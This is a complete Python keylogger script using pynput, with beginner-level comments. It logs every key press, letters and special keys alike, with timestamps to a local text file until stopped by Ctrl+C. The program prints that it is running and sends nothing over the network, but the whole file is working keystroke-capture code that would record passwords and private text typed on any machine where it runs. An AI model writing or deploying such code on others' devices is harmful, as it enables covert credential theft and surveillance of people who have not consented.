# Import required libraries
from pynput import keyboard      # For detecting keyboard presses
import threading                 # For running tasks in parallel
import signal                    # For handling program shutdown signals
import sys                       # For system-related functions
from datetime import datetime    # For adding timestamps
import os                        # For file and path operations

class KeyLogger:
    # A class that handles keyboard logging operations.
    
    def __init__(self, filename="keyfile.txt"):
        # This is like setting up a new notebook to write in.
        # It runs when we first create our keylogger.
        
        # Name of the file where we'll save the keys
        self.filename = filename
        
        # This is like an ON/OFF switch - True means we're running
        self.running = True
        
        # This is our "stop button" - we use it to safely stop the program
        self.stop_event = threading.Event()
        
    def timestamp(self):
        # Creates a timestamp
        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    def key_pressed(self, key):
        # Handles the event triggered when a key is pressed.
        # This method logs the pressed key along with a timestamp to a specified file.
        # It differentiates between normal keys (e.g., letters, numbers) and special keys
        # (e.g., Shift, Ctrl) and writes the appropriate information to the log file.

        # Args:
        #     key: The key object representing the key that was pressed.

        # Returns:
        #     bool: Returns True to continue listening for key presses unless the stop event is set.

        # Exceptions:
        #     If an error occurs during the logging process, it prints an error message
        #     describing the issue.
        try:
            # Open our file (like opening a notebook)
            # 'with' makes sure we close the file properly when we're done
            with open(self.filename, 'a') as log_file:
                # Get the current time
                timestamp = self.timestamp()
                
                # Check what kind of key was pressed
                if hasattr(key, 'char'):
                    # Normal keys (letters, numbers, etc.)
                    # Write it in our file with the time
                    log_file.write(f'[{timestamp}] Char: {key.char}\n')
                else:
                    # Special keys (Shift, Ctrl, etc.)
                    log_file.write(f'[{timestamp}] Special Key: {str(key)}\n')
                    
        except Exception as e:
            # If something goes wrong, tell us what happened
            print(f"Oops! Something went wrong while logging: {str(e)}")
            
        # Keep running unless someone told us to stop
        return not self.stop_event.is_set()

    def signal_handler(self, signum, frame):
        # This is like having an emergency stop button.
        # When someone presses Ctrl+C, this function catches it and stops safely.
        print("\nSomeone pressed Ctrl+C! Stopping the program...")
        self.stop()

    def stop(self):
        # This is our shutdown procedure.
        
        # Tell the program it's time to stop
        self.stop_event.set()
        self.running = False
        
    def start(self):
        # Set up our emergency stop button (Ctrl+C handler)
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Start listening to the keyboard
        # The 'with' statement makes sure we clean up properly when done
        with keyboard.Listener(on_press=self.key_pressed) as listener:
            # Let the user know we're ready
            print(f"Keylogger is now running! Writing to {self.filename}")
            print("If you want to stop, just press Ctrl+C...")
            
            # This is our main loop - it keeps the program running
            while self.running and not self.stop_event.is_set():
                # Check every second if someone wants us to stop
                self.stop_event.wait(timeout=1.0)
                
            # When we're done, stop listening to the keyboard
            listener.stop()
            
        print("\nKeylogger has stopped.")

# This is where our program actually starts
if __name__ == "__main__":
    # Create our keylogger
    logger = KeyLogger()
    
    # Start logging! 
    logger.start()
